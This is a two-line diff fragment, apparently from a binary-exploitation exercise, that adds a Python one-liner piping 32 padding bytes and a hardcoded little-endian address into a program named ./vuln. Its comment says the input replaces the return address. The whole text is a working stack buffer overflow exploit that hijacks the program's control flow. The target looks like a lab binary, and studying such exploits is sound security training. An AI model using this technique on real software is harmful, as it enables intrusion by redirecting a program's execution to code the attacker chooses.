@@ -1,0 +1,2 @@
+// replaces the return address
+python -c 'print "a"*32+ "\x8b\x84\x04\x08"' | ./vuln
